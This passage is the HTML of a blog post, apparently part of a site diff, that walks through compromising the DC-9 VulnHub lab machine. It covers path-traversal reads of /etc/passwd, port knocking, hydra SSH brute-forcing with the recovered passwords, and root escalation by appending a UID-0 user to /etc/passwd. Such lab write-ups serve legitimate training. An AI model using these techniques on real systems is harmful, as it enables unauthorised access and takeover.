+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://192.168.34.5/manage.php?file<span class="o">=</span>../../../../../../../etc/passwd</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2012.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2012.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2012.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2012.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2012.png"
+        title="Untitled" width="1003" height="748" /></p>
+<p>We are successful, in the scan with nmap we discovered that the ssh port was filtered and what comes to mind is the Port Knocking technique so I am going to see the Knock configuration files</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://192.168.34.5/manage.php?file<span class="o">=</span>../../../../../../../etc/knockd.conf</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2013.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2013.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2013.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2013.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2013.png"
+        title="Untitled" width="1002" height="245" /></p>
+<p>We obtain the sequence to introduce with knock</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">knock -v 192.168.34.5 <span class="m">7469</span> <span class="m">8475</span> <span class="m">9842</span>
+</span></span><span class="line"><span class="cl">hitting tcp 192.168.34.5:7469
+</span></span><span class="line"><span class="cl">hitting tcp 192.168.34.5:8475
+</span></span><span class="line"><span class="cl">hitting tcp 192.168.34.5:9842</span></span></code></pre></div></div>
+<p>I check that the port has been opened</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sV 192.168.34.5
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span>https://nmap.org<span class="o">)</span> at 2023-09-17 19:20 CEST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> example.com <span class="o">(</span>192.168.34.5<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00012s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open http Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:C1:23:27 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 6.54 seconds</span></span></code></pre></div></div>
+<p>With the users obtained previously I perform a brute force attack with hydra</p>
+<p>I create a file with users</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat creds <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f1 &gt; users.txt</span></span></code></pre></div></div>
+<p>I create passwords file</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat creds <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2 &gt; passwords.txt</span></span></code></pre></div></div>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -L users.txt -P passwords.txt 192.168.34.5 ssh
+</span></span><span class="line"><span class="cl">Hydra v9.4 <span class="o">(</span>c<span class="o">)</span> <span class="m">2022</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes <span class="o">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2023-09-23 13:27:05
+</span></span><span class="line"><span class="cl"><span class="o">[</span>WARNING<span class="o">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span class="m">4</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">289</span> login tries <span class="o">(</span>l:17/p:17<span class="o">)</span>, ~19 tries per task
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking ssh://192.168.34.5:22/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>22<span class="o">][</span>ssh<span class="o">]</span> host: 192.168.34.5 login: chandlerb password: UrAG0D!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>22<span class="o">][</span>ssh<span class="o">]</span> host: 192.168.34.5 login: joeyt password: Passw0rd
+</span></span><span class="line"><span class="cl"><span class="o">[</span>22<span class="o">][</span>ssh<span class="o">]</span> host: 192.168.34.5 login: janitor password: Ilovepeepee
+</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 287.00 tries/min, <span class="m">287</span> tries in 00:01h, <span class="m">4</span> to <span class="k">do</span> in 00:01h, <span class="m">14</span> active
+</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">3</span> valid passwords found
+</span></span><span class="line"><span class="cl"><span class="o">[</span>WARNING<span class="o">]</span> Writing restore file because <span class="m">1</span> final worker threads did not <span class="nb">complete</span> <span class="k">until</span> end.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ERROR<span class="o">]</span> <span class="m">1</span> target did not resolve or could not be connected
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ERROR<span class="o">]</span> <span class="m">0</span> target did not <span class="nb">complete</span>
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2023-09-23 13:28:08</span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chandlerb:UrAG0D
+</span></span><span class="line"><span class="cl">joeyt:Passw0rd
+</span></span><span class="line"><span class="cl">janitor:Ilovepeepee</span></span></code></pre></div></div>
+<p>Login as janitor</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh janitor@192.168.34.5</span></span></code></pre></div></div>
+<p>Enumerating we find the following directory</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2014.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2014.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2014.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2014.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2014.png"
+        title="Untitled" width="620" height="202" /></p>
+<p>Inside we find the file passwords-found-on-post-it-notes.txt with the following passwords</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">BamBam01
+</span></span><span class="line"><span class="cl">Passw0rd
+</span></span><span class="line"><span class="cl">smellycats
+</span></span><span class="line"><span class="cl">P0Lic#10-4
+</span></span><span class="line"><span class="cl">B4-Tru3-001
+</span></span><span class="line"><span class="cl">4uGU5T-NiGHts</span></span></code></pre></div></div>
+<p>I perform a new brute force attack with the passwords obtained</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -L users.txt -P newpasswords 192.168.34.5 ssh
+</span></span><span class="line"><span class="cl">Hydra v9.4 <span class="o">(</span>c<span class="o">)</span> <span class="m">2022</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes <span class="o">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2023-09-17 20:34:37
+</span></span><span class="line"><span class="cl"><span class="o">[</span>WARNING<span class="o">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span class="m">4</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">102</span> login tries <span class="o">(</span>l:17/p:6<span class="o">)</span>, ~7 tries per task
+</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking ssh://192.168.34.5:22/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>22<span class="o">][</span>ssh<span class="o">]</span> host: 192.168.34.5 login: fredf password: B4-Tru3-001
+</span></span><span class="line"><span class="cl"><span class="o">[</span>22<span class="o">][</span>ssh<span class="o">]</span> host: 192.168.34.5 login: joeyt password: Passw0rd
+</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">2</span> valid passwords found
+</span></span><span class="line"><span class="cl"><span class="o">[</span>WARNING<span class="o">]</span> Writing restore file because <span class="m">1</span> final worker threads did not <span class="nb">complete</span> <span class="k">until</span> end.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ERROR<span class="o">]</span> <span class="m">1</span> target did not resolve or could not be connected
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ERROR<span class="o">]</span> <span class="m">0</span> target did not <span class="nb">complete</span>
+</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2023-09-17 20:34:58</span></span></code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Login as fredf</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh fredf@192.168.34.5</span></span></code></pre></div></div>
+<p>We execute sudo -l and see that we have permissions to execute the following script</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2015.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2015.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2015.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2015.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2015.png"
+        title="Untitled" width="877" height="106" /></p>
+<p>I run it to see how it works</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2016.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2016.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2016.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2016.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2016.png"
+        title="Untitled" width="399" height="66" /></p>
+<p>It seems that two files are introduced, the first one that it reads and the second one to which the content of the first one is added, so to escalate privileges I am going to create a user and add it to the passwd file</p>
+<p>Creating the user hash (123)</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">openssl passwd -1
+</span></span><span class="line"><span class="cl"><span class="nv">$1$buZKpXN3$NPI6IUJkJTJKQTwGdqfyo1</span></span></span></code></pre></div></div>
+<p>We create a file with the following (user.txt)</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user:<span class="nv">$1$buZKpXN3$NPI6IUJkJTJKQTwGdqfyo1</span>:0:0:user:/root:/bin/bash</span></span></code></pre></div></div>
+<p>We execute script</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /opt/devstuff/dist/test/test user.txt /etc/passwd</span></span></code></pre></div></div>
+<p>we change the new user as root</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">fredf@dc-9:~$ su user
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">root@dc-9:/home/fredf# whoami
+</span></span><span class="line"><span class="cl">root</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2017.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2017.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2017.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2017.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2017.png"
+        title="Untitled" width="686" height="422" /></p>
+<p>And that&rsquo;s it</p>
+<p>Happy Hacking!</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-09-23</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/en/dc-9/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/en/dc-9/" data-title="DC-9 Walkthrough" data-hashtags="Walkthrough,Vulnhub,TjNull,OSCP,Medium"><i class="fab fa-x-twitter" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/en/dc-9/" data-title="DC-9 Walkthrough"><i class="fab fa-threads" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/en/dc-9/" data-hashtag="Walkthrough"><i class="fab fa-facebook-square" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/en/dc-9/"><i class="fab fa-linkedin" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/en/dc-9/" data-title="DC-9 Walkthrough"><i class="fab fa-hacker-news" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/en/dc-9/" data-title="DC-9 Walkthrough"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/en/dc-9/" data-title="DC-9 Walkthrough"><i class="fab fa-weibo" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/en/dc-9/" data-title="DC-9 Walkthrough" data-description=""><i class="fab fa-diaspora" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fen%2fdc-9%2f&amp;text=DC-9%20Walkthrough" target="_blank" title="Share on Telegram"><i class="fab fa-telegram" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/en/tags/walkthrough/">Walkthrough</a>,&nbsp;<a href="/en/tags/vulnhub/">Vulnhub</a>,&nbsp;<a href="/en/tags/tjnull/">TjNull</a>,&nbsp;<a href="/en/tags/oscp/">OSCP</a>,&nbsp;<a href="/en/tags/medium/">Medium</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/en/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/en/kioptrix_level_5/" class="prev" rel="prev" title="Kioptrix Level 5 Walkthrough"><i class="fas fa-angle-left" aria-hidden="true"></i>Kioptrix Level 5 Walkthrough</a>
+            <a href="/en/sauna/" class="next" rel="next" title="Sauna Walkthrough">Sauna Walkthrough<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.157.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/en/" target="_blank">AnTuSec</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/algoliasearch/lite/browser.umd.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"algoliaAppID":"4D1IDY8JU6","algoliaIndex":"index","algoliaSearchKey":"05332ac5ed76655a511f0da583a9afac","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script src="/js/theme.js"></script></body>
+</html>
